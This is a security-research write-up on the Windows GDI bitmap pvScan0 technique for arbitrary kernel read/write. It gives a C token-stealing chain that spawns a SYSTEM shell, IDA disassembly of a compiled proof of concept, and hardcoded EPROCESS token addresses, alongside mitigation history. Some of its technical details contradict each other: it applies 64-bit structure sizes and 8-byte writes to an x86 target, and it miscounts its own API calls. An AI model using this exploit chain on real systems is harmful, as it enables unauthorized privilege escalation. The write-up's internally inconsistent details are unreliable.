---
author: Utku Erol
title: "The API That Trusts Its Own State: GDI Bitmap Abuse for Arbitrary Kernel R/W"
date: 2026-05-17
tags: [windows-kernel, gdi, surfobj, pvscan0, lpe, token-stealing, kernel-rw-primitive]
cluster: kernel-memory-model
related:
  - RS2-Bitmap-Necromancy-Writeup
  - Double-Fetch-Race-Writeup
  - MDL-Abuse-Writeup
---

## Author's Note

Most kernel exploits work by corrupting something that was not supposed to be corrupted — overflowing a buffer, underflowing a reference count, using memory after it has been freed. This writeup describes a different class: corrupting something that *can* be written by design, but was only supposed to hold pixel data.

Windows GDI (Graphics Device Interface) is the kernel subsystem that handles bitmap rendering. Its `SetBitmapBits` and `GetBitmapBits` APIs exist to move pixel data in and out of bitmap objects. Internally, these APIs read and write through a raw kernel pointer — `SURFOBJ.pvScan0` — with no bounds checking or type validation beyond confirming the bitmap handle is valid.

If `pvScan0` can be redirected to an arbitrary kernel address, `SetBitmapBits` becomes an arbitrary kernel write and `GetBitmapBits` becomes an arbitrary kernel read. The APIs do exactly what their names say — they read and write bits — and they have no reason to ask where those bits live.

---

## Abstract

The Windows GDI subsystem allocates a `SURFOBJ` structure in kernel memory for every bitmap created via `CreateBitmap`. The `pvScan0` field of `SURFOBJ` is a raw pointer to the bitmap's pixel data. `SetBitmapBits` and `GetBitmapBits` write to and read from this pointer without validating whether it lies within the bitmap's legitimate allocation.

The exploit uses two bitmaps — a Manager and a Worker — where the Manager's `pvScan0` is overwritten to point at the Worker's `SURFOBJ.pvScan0` field. With this redirection in place, the Manager becomes a "pointer controller": writing to the Manager with `SetBitmapBits` sets the Worker's `pvScan0` to any kernel address. From that point, `GetBitmapBits(hWorker, ...)` reads from that address and `SetBitmapBits(hWorker, ...)` writes to it — an arbitrary kernel R/W primitive constructed entirely from documented user-mode GDI APIs.

The canonical payload is token stealing: read the SYSTEM process's `EPROCESS.Token`, write it to the current process's `EPROCESS.Token`, and spawn `cmd.exe` with SYSTEM privileges. The full chain from `CreateBitmap` to SYSTEM shell is demonstrated with IDA disassembly from an actual compiled PoC.

---

## §1 — GDI and the Kernel Object Behind Every Handle

Windows GDI is a kernel-mode subsystem (`win32k.sys`) that handles all graphics operations: drawing pixels, managing device contexts, representing bitmaps. When user-mode code calls `CreateBitmap`, the kernel allocates and initializes a `SURFOBJ` structure — a kernel heap object representing the bitmap's internal state.

The caller receives an `HBITMAP` handle — an opaque integer that indexes into the process's GDI handle table. The handle is user-visible; the `SURFOBJ` is not. Normal user-mode code has no mechanism to directly read or write the `SURFOBJ` — it can only interact with the bitmap through documented GDI APIs.

The relevant structure (simplified):

```c
typedef struct _SURFOBJ {
    DHSURF  dhsurf;        // device-dependent surface
    HSURF   hsurf;         // GDI handle
    SIZEL   sizlBitmap;    // width/height in pixels
    ULONG   cjBits;        // total data size in bytes
    PVOID   pvBits;        // base of pixel data allocation
    PVOID   pvScan0;       // pointer to first scanline of pixel data ← exploit target
    LONG    lDelta;        // bytes per scanline (stride)
} SURFOBJ;
```

`pvScan0` is the pointer that `SetBitmapBits` and `GetBitmapBits` ultimately dereference. It points to the bitmap's pixel data. On a 1×1 bitmap with one pixel, it points to 4 bytes. There is no runtime check that `pvScan0` still points into the bitmap's allocated region — the API trusts that the kernel's own internal state is valid.

This is the assumption the exploit violates.

---

## §2 — Navigating From Handle to `pvScan0`

To overwrite `pvScan0`, its kernel address must first be located. The navigation chain:

```
HBITMAP handle
  │
  ├── extract index: (handle & 0xFFFF)
  │
  ▼
PEB.GdiSharedHandleTable   (user-mode accessible)
  │
  ├── + index × sizeof(_GDI_CELL)  (0x18 on 64-bit)
  │
  ▼
_GDI_CELL.pKernelAddress   ← kernel pointer to SURFOBJ
  │
  ├── + offset of pvScan0  (0x30 on x86 target)
  │
  ▼
SURFOBJ.pvScan0             ← our overwrite target
```

The `GdiSharedHandleTable` is located at `PEB + 0xF8` (32-bit) or `PEB + 0x248` (64-bit). It is mapped into the process's user-mode address space, making it readable without kernel access:

```c
typedef struct _GDI_CELL {
    PVOID   pKernelAddress;   // kernel pointer to SURFOBJ
    UINT16  wProcessId;       // owning process
    UINT16  wCount;           // reference count
    UINT16  wUpper;           // internal handle index
    UINT16  wType;            // 0x02 = bitmap
    PVOID   pUserAddress;     // user-mode handle (sometimes null)
};
```

On the target system, WinDbg resolves:

```
PEB + 0xF8   → GdiSharedHandleTable = 0x00340000
HBITMAP      = 0x31050216
index        = 0x0216
entry addr   = 0x00340000 + (0x216 × 0x18) = 0x33D6D0
pKernelAddress = 0xFE7F7000   ← SURFOBJ in kernel
pvScan0 addr = 0xFE7F7000 + 0x30 = 0xFE7F7030
```

This is the address that must be overwritten with an attacker-controlled kernel pointer. Once overwritten, the Manager bitmap's `SetBitmapBits` call will write to wherever pvScan0 now points.

---

## §3 — The Manager/Worker Pattern

The exploit requires two bitmaps because a single-bitmap approach would corrupt the bitmap being used to perform reads and writes. The Manager/Worker pattern separates concerns:

```
Manager bitmap
  └─ SURFOBJ.pvScan0  ────────────────────┐
                                          │ overwritten by initial kernel write
Worker bitmap                             ▼
  └─ SURFOBJ.pvScan0  ← Manager's pvScan0 now points here

Result:
  SetBitmapBits(hManager, ...)   → writes to Worker's pvScan0 field
  GetBitmapBits(hWorker,  ...)   → reads from whatever Worker's pvScan0 points to
  SetBitmapBits(hWorker,  ...)   → writes to whatever Worker's pvScan0 points to
```

With this in place, the primitives:

**Arbitrary kernel read:**
```
1. SetBitmapBits(hManager, sizeof(ULONG64), &targetKernelAddress)
   → Worker.pvScan0 = targetKernelAddress
2. GetBitmapBits(hWorker, sizeof(ULONG64), &buffer)
   → buffer = *(ULONG64*)targetKernelAddress
```

**Arbitrary kernel write:**
```
1. SetBitmapBits(hManager, sizeof(ULONG64), &targetKernelAddress)
   → Worker.pvScan0 = targetKernelAddress
2. SetBitmapBits(hWorker, sizeof(ULONG64), &sourceData)
   → *(ULONG64*)targetKernelAddress = sourceData
```

The primitives are achieved entirely through public, documented GDI APIs. No kernel shellcode, no interrupt manipulation, no hardware interaction. The kernel cooperates with the exploit by executing exactly what the APIs specify.

---

## §4 — Token Stealing: From R/W Primitive to SYSTEM

With arbitrary kernel R/W established, the canonical LPE payload targets the access token field in EPROCESS:

```
_EPROCESS + 0xF8   → Token (Windows 7 x86 offset)
```

The Token field holds a reference-counted pointer to an `_EX_FAST_REF` structure representing the process's access token. If this field is overwritten with the SYSTEM process's token pointer, the process gains SYSTEM privileges.

### Step 1: Locate Kernel Addresses

WinDbg resolves the relevant addresses:

```
SYSTEM process EPROCESS:  0x8297F03C   → Token at +0xF8 = 0x8297F134
Target process EPROCESS:  0x85F26548   → Token at +0xF8 = 0x85F26640
```

### Step 2: Execute the Chain

```c
DWORD64 systemToken = 0;

// Point Worker's pvScan0 at SYSTEM's Token field
DWORD64 target = 0x8297F134;
SetBitmapBits(hManager, 8, &target);

// Read SYSTEM Token value through Worker
GetBitmapBits(hWorker, 8, &systemToken);
// systemToken now holds SYSTEM's token value

// Point Worker's pvScan0 at our process's Token field
target = 0x85F26640;
SetBitmapBits(hManager, 8, &target);

// Write SYSTEM Token into our process's Token field
SetBitmapBits(hWorker, 8, &systemToken);

// Spawn elevated shell
WinExec("cmd.exe", SW_SHOW);
```

`cmd.exe` inherits the token of its parent process — now SYSTEM. The shell spawns with full SYSTEM privileges.

---

## §5 — Disassembly Analysis

The compiled PoC (x86, IDA disassembly) confirms the chain matches the source:

**`CreateBitmap` calls:**
```asm
.text:0040100E push    0             ; lpBits = null
.text:00401010 push    20h           ; nBitCount = 32bpp
.text:00401012 push    1             ; nPlanes
.text:00401014 push    1             ; nHeight = 1 pixel
.text:00401016 push    1             ; nWidth  = 1 pixel
.text:0040101E call    esi           ; CreateBitmap → hManager in edi
.text:0040102C call    esi           ; CreateBitmap → hWorker  in esi
```

Two 1×1 32bpp bitmaps. Minimum size — only the `SURFOBJ` header and a 4-byte pixel buffer are allocated. The exploit does not need real pixel data.

**`pvScan0` overwrite — Worker pointed at PowerShell token:**
```asm
.text:00401064 mov     [esp+pvBits], 85F26640h  ; PowerShell EPROCESS.Token
.text:00401074 push    eax            ; &targetAddr
.text:00401075 push    8              ; 8 bytes (DWORD64 pointer)
.text:00401077 push    edi            ; hManager
.text:00401078 call    ebx            ; SetBitmapBits
```

**SYSTEM token read via Worker:**
```asm
.text:004010A2 mov     [esp+pvBits], 8297F134h  ; SYSTEM EPROCESS.Token
.text:004010B9 push    edi            ; hManager
.text:004010BA call    ebx            ; SetBitmapBits — Worker now → SYSTEM Token
.text:004010DF call    ds:GetBitmapBits ; hWorker reads SYSTEM Token into [vBits]
```

**SYSTEM token written to PowerShell:**
```asm
.text:00401115 mov     [esp+pvBits], 85F26640h  ; back to PowerShell token
.text:0040112D call    ebx            ; SetBitmapBits — Worker → PowerShell Token
.text:00401152 call    ebx            ; SetBitmapBits — write SYSTEM token here
```

**Shell spawn:**
```asm
.text:00401183 call    ds:WinExec     ; WinExec("cmd.exe", SW_SHOW)
```

The disassembly confirms that the entire exploit chain — from bitmap creation to SYSTEM shell — executes through five documented Windows API calls: `CreateBitmap` (×2), `SetBitmapBits` (×4), `GetBitmapBits` (×1), `WinExec` (×1). No system calls are invoked directly. No shellcode executes in kernel mode.

---

## §6 — The Design Flaw: Trusted Internal State

The fundamental issue is architectural rather than implementational. The GDI API contract:

> `SetBitmapBits(hbm, cb, lpvBits)` — Copies bitmap bit values to the specified location and returns the number of bytes copied.

The API's internal implementation dereferences `SURFOBJ.pvScan0` to find "the specified location." There is no postcondition check that `pvScan0` is within the bitmap's allocated region. The API's correctness depends on the invariant that `pvScan0` has not been modified since allocation.

This invariant is maintained by the kernel's memory isolation guarantees — kernel structures are not accessible from user-mode. If that assumption holds, `pvScan0` cannot be corrupted. If any other vulnerability provides kernel write access, `pvScan0` is reachable and the GDI API collapses into a general-purpose kernel R/W primitive.

The GDI API is not the vulnerability — it is the amplifier. Any kernel write primitive, regardless of its original scope or intended impact, can be converted into an unlimited arbitrary kernel R/W primitive via a single `pvScan0` overwrite. This is why GDI bitmap abuse was the universal second-stage in Windows kernel exploits from approximately 2013 through Windows 10 RS1.

---

## §7 — Mitigation History and the RS2 Transition

**Windows 10 RS1 (Anniversary Update, 2016):** Microsoft moved GDI objects out of the kernel paged pool into a dedicated pool isolated from other kernel allocations. `SURFOBJ` structures are no longer adjacent to kernel function pointers, making pool overflow–based initial overwrites of `pvScan0` significantly harder.

**Windows 10 RS2 (Creators Update, 2017):** The `pvScan0` field in the desktop heap `SURFOBJ` was restricted to desktop-heap-range addresses on x64 builds. `SetBitmapBits` and `GetBitmapBits` were modified to reject calls where the resulting dereference falls outside the desktop heap. The classic technique described in this writeup no longer functions on RS2+ 64-bit systems.

The response to this mitigation is the technique covered in the companion writeup (`RS2-Bitmap-Necromancy-Writeup`): a Use-After-Free variant that achieves the same `pvScan0` overwrite by exploiting desktop heap object recycling rather than direct pool corruption.

The transition from GDI Bitmap Abuse to RS2 Necromancy is a clean illustration of the mitigation-escalation cycle: the defense patches the most direct exploitation path, and the response moves to a more indirect but structurally equivalent technique targeting the same interface.

---

## §8 — Reference: EPROCESS Offsets and Address Table

| Symbol | Value | Source |
|---|---|---|
| `SYSTEM EPROCESS` | `0x8297F03C` | WinDbg `!process 4 0` |
| `SYSTEM Token` | `0x8297F03C + 0xF8 = 0x8297F134` | `dt nt!_EPROCESS` |
| `Target EPROCESS (PowerShell)` | `0x85F26548` | WinDbg `!process 0 0 powershell.exe` |
| `Target Token` | `0x85F26548 + 0xF8 = 0x85F26640` | Same |
| `GdiSharedHandleTable` | `0x00340000` | `dt nt!_PEB @$peb GdiSharedHandleTable` |
| `Manager pKernelAddress` | `0xFE7F7000` | GDI_CELL.pKernelAddress from table |
| `Manager pvScan0 addr` | `0xFE7F7000 + 0x30 = 0xFE7F7030` | SURFOBJ layout offset |

All addresses are system-specific and session-specific. A production exploit would derive them dynamically via the PEB walk and WinDbg-equivalent userspace reads rather than hardcoded constants.

---

## §9 — Related Writeups

**`RS2-Bitmap-Necromancy-Writeup`** — Direct successor technique. RS2 Necromancy uses a UAF on a freed desktop heap object to achieve the same `pvScan0` overwrite that this writeup achieves via direct pool write. The final arbitrary R/W primitive and token steal chain are identical; only the path to `pvScan0` corruption differs.

**`MDL-Abuse-Writeup`** — MDL abuse (`IoAllocateMdl` + `MmBuildMdlForNonPagedPool` + `MmMapLockedPagesSpecifyCache`) achieves arbitrary kernel R/W by converting a virtual address to its physical page list and re-mapping it with write permissions. GDI bitmap abuse achieves the same by redirecting an API-internal kernel pointer. Both produce the same capability from different directions — GDI via API state corruption, MDL via physical mapping.

**`Double-Fetch-Race-Writeup`** — The double-fetch writeup examines temporal corruptions (a validated value mutated between check and use). This writeup examines spatial corruption (a kernel pointer redirected to an address outside its legitimate range). Both are instances of the broader pattern: a kernel invariant that holds under correct operation fails when the attacker can modify one dimension — time (double-fetch) or space (pvScan0 overwrite).

The claim this writeup makes: **a documented API that trusts its own internal state is only as safe as the mechanism that protects that state.** If the protection mechanism (kernel memory isolation) fails — for any reason — the API's contract collapses. GDI was not designed to be an exploit primitive; it became one by trusting a pointer that could be repointed.

---

*Research context: educational analysis of the GDI bitmap exploitation technique documented in public security research. The technique applies to Windows systems prior to RS2 (Windows 10 Creators Update, 2017). Demonstrated with IDA disassembly from a test-environment compiled PoC.*
